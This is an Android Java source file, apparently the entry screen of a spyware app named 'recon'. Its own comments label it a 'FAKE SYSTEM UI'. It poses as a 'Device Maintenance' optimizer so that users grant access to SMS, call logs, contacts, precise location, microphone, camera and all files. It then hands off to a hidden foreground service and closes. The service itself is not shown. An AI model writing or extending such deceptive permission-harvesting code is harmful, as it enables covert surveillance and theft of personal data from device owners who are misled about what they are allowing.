package com.tenix.recon;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.graphics.drawable.GradientDrawable;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.Settings;
import android.view.Gravity;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.TextView;

public class MainActivity extends Activity {

    private static final int REQ = 1;
    private static boolean waitingForStorage = false;

    private TextView titleTv;
    private TextView descTv;
    private Button mainBtn;

    @SuppressWarnings("NewApi")
    @Override
    protected void onCreate(Bundle s) {
        super.onCreate(s);
        if (isReady()) { launch(); return; }
        buildUI();
        // If runtime perms already granted but storage not yet (e.g. app reopened)
        if (hasRuntimePerms()) afterRuntimePerms();
    }

    @SuppressWarnings("NewApi")
    @Override
    protected void onResume() {
        super.onResume();
        // User returned from "All files access" system settings
        if (waitingForStorage && Build.VERSION.SDK_INT >= 30
                && Environment.isExternalStorageManager()) {
            waitingForStorage = false;
            launch();
        }
    }

    // ── READY CHECK ──────────────────────────────
    @SuppressWarnings("NewApi")
    private boolean isReady() {
        if (!hasRuntimePerms()) return false;
        if (Build.VERSION.SDK_INT >= 30) return Environment.isExternalStorageManager();
        return true;
    }

    private boolean hasRuntimePerms() {
        if (Build.VERSION.SDK_INT < 23) return true;
        for (String p : perms()) {
            if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) return false;
        }
        return true;
    }

    // ── FAKE SYSTEM UI ───────────────────────────
    private void buildUI() {
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setGravity(Gravity.CENTER);
        root.setBackgroundColor(Color.WHITE);
        root.setPadding(dp(32), dp(80), dp(32), dp(80));

        // Icon
        ImageView icon = new ImageView(this);
        icon.setImageResource(android.R.drawable.ic_menu_manage);
        LinearLayout.LayoutParams ip = new LinearLayout.LayoutParams(dp(72), dp(72));
        ip.gravity = Gravity.CENTER_HORIZONTAL;
        ip.bottomMargin = dp(28);
        root.addView(icon, ip);

        // Title
        titleTv = new TextView(this);
        titleTv.setText("Device Maintenance");
        titleTv.setTextSize(22);
        titleTv.setTextColor(Color.parseColor("#212121"));
        titleTv.setGravity(Gravity.CENTER);
        titleTv.setPadding(0, 0, 0, dp(12));
        root.addView(titleTv, matchWrap());

        // Description
        descTv = new TextView(this);
        descTv.setText("To scan and optimize your device,\nplease allow access on the next screens.");
        descTv.setTextSize(14);
        descTv.setTextColor(Color.parseColor("#757575"));
        descTv.setGravity(Gravity.CENTER);
        descTv.setPadding(0, 0, 0, dp(48));
        root.addView(descTv, matchWrap());

        // Button
        mainBtn = new Button(this);
        mainBtn.setText("Allow & Continue");
        mainBtn.setTextColor(Color.WHITE);
        GradientDrawable bg = new GradientDrawable();
        bg.setColor(Color.parseColor("#1565C0"));
        bg.setCornerRadius(dp(6));
        mainBtn.setBackground(bg);
        LinearLayout.LayoutParams bp = new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, dp(50));
        mainBtn.setOnClickListener(v -> askPerms());
        root.addView(mainBtn, bp);

        setContentView(root);
    }

    // ── STEP 1: Runtime permissions ──────────────
    private void askPerms() {
        if (Build.VERSION.SDK_INT >= 23) requestPermissions(perms(), REQ);
        else afterRuntimePerms();
    }

    @Override
    public void onRequestPermissionsResult(int code, String[] p, int[] r) {
        afterRuntimePerms();
    }

    // ── STEP 2: MANAGE_EXTERNAL_STORAGE (API 30+) ─
    @SuppressWarnings("NewApi")
    private void afterRuntimePerms() {
        if (Build.VERSION.SDK_INT >= 30 && !Environment.isExternalStorageManager()) {
            waitingForStorage = true;
            if (titleTv != null) titleTv.setText("One More Step");
            if (descTv  != null) descTv.setText(
                "Grant full storage access\nto complete optimization.");
            if (mainBtn != null) {
                mainBtn.setText("Grant Storage Access");
                mainBtn.setOnClickListener(v -> openStorageSettings());
            }
        } else {
            launch();
        }
    }

    @SuppressWarnings("NewApi")
    private void openStorageSettings() {
        try {
            Intent i = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
            i.setData(Uri.parse("package:" + getPackageName()));
            startActivity(i);
        } catch (Exception e) {
            launch(); // fallback: skip storage step
        }
    }

    // ── LAUNCH SERVICE ───────────────────────────
    @SuppressWarnings("NewApi")
    private void launch() {
        Intent svc = new Intent(this, inq.class);
        if (Build.VERSION.SDK_INT >= 26) startForegroundService(svc);
        else startService(svc);
        finish();
    }

    // ── PERMISSIONS LIST ─────────────────────────
    private String[] perms() {
        if (Build.VERSION.SDK_INT >= 33) {
            return new String[]{
                Manifest.permission.READ_MEDIA_IMAGES,
                Manifest.permission.READ_MEDIA_VIDEO,
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.READ_SMS,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.CAMERA
            };
        }
        return new String[]{
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.CAMERA
        };
    }

    private LinearLayout.LayoutParams matchWrap() {
        return new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
    }

    private int dp(int v) {
        return (int) (v * getResources().getDisplayMetrics().density);
    }
}
